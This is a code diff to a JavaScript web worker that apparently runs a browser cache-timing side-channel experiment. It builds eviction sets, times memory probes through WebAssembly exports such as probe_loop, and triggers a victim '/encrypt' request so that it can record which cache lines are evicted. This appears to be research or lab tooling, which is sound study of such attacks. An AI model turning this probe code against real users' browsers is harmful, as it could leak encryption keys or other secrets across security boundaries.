@@ -3,6 +3,7 @@ function sleep(ms) {
 }
 
 async function encrypt() {
+    await sleep(10);
     console.log("calling encrypt");
     fetch("/encrypt", { method: "POST" }).then(() =>
         console.log("encrypt done!"),
@@ -245,6 +246,7 @@ self.onmessage = async (event) => {
     const timed_hit = wasmUtils.exports.timed_hit;
     const probe = wasmUtils.exports.probe;
     const timed_miss = wasmUtils.exports.timed_miss;
+    const probe_loop = wasmUtils.exports.probe_loop;
     // const timed_miss = wasmUtils.exports.timed_miss;
     // const timed_miss = null;
 
@@ -275,35 +277,47 @@ self.onmessage = async (event) => {
     const total_num_results = config.time_slots * config.probe.length;
     const results = new Uint32Array(total_num_results);
     console.log("total number of results:", total_num_results)
-    const time_slot_size = BigInt(config.time_slot_size)
-    const startTime = new Date();
-    const wait_cycles = BigInt(config.wait_cycles);
-    const num_addrs = 1; // config.probe.length
-    const targets = [config.probe[0]]
+    const time_slot_size = config.time_slot_size
+    const wait_cycles = config.wait_cycles;
+    const num_addrs = config.probe.length;
+    const targets = new Uint32Array(config.probe);
     const evset_bases = new Uint32Array(evsets.map(e => e[0]))
-    encrypt();
-    for(let i = 0; i < total_num_results; i += num_addrs) {
-        // const slotTime = wasmUtils.exports.get_time()
-        for(let j = 0; j < num_addrs; j++) {
-            // access(targets[j])
-            // evict(evset_bases[j]);
-            // results[i + j] = timed_miss(targets[j], evset_bases[j])
-            results[i + j] = timed_access(targets[j]);
-            evict(evset_bases[j])
-        }
-        // evict(conflictSet[0]);
-        // wait(wait_cycles, time_slot_size)
-        // do {
-        //     wait(config.wait_cycles)
-        // } while (get_time() - slotTime < time_slot_size);
+    const resultsPtr = memDataView.byteLength - (total_num_results * 4);
+    // copy evset bases and targets to memory
+    const evsetsPtr = 64;
+    const victimsPtr = 128;
+    for(let i = 0; i < num_addrs; i++) {
+        memDataView.setUint32(evsetsPtr + 4 * i, evset_bases[i], true)
+        memDataView.setUint32(victimsPtr + 4 * i, targets[i], true)
     }
+    for(let i = 0; i < results.length; i++) {
+        // results[i] = results[i] < config.threshold ? 1 : 0
+        memDataView.setUint32(resultsPtr + 4 * i, 10, true)
+        // results[i] = memDataView.getUint32(resultsPtr + 4 * i, true)
+        // if(!results[i]) numEvicted++;
+    }
+    const startTime = new Date();
+    // encrypt();
+    probe_loop(num_addrs, victimsPtr, evsetsPtr, resultsPtr, memDataView.byteLength)
+    // console.log("probeloop:", probe_loop(1, targets[0], evset_bases[0], resultsPtr, memDataView.byteLength))
+    // for(let i = 0; i < total_num_results; i += num_addrs) {
+    //     for(let j = 0; j < num_addrs; j++) {
+    //         // access(targets[j])
+    //         // evict(evset_bases[j]);
+    //         // results[i + j] = timed_miss(targets[j], evset_bases[j])
+    //         results[i + j] = probe(targets[j], evset_bases[j]);
+    //     }
+    //     // evict(conflictSet[0]);
+    //     wait(wait_cycles, time_slot_size)
+    // }
     const testTime = new Date(new Date() - startTime);
     console.log(`test took: ${testTime.getMinutes()} mins, ${testTime.getSeconds()} secs and ${testTime.getMilliseconds()} ms`)
     let numEvicted = 0
-    // for(let i = 0; i < results.length; i++) {
-    //     results[i] = results[i] < config.threshold ? 1 : 0
-    //     if(!results[i]) numEvicted++;
-    // }
+    for(let i = 0; i < results.length; i++) {
+        // results[i] = results[i] < config.threshold ? 1 : 0
+        results[i] = memDataView.getUint32(resultsPtr + 4 * i, true)
+        if(!results[i]) numEvicted++;
+    }
     console.log("numEvicted:", numEvicted)
     console.log("percentage evicted:", numEvicted / results.length)
     self.postMessage({results: results, config: config });
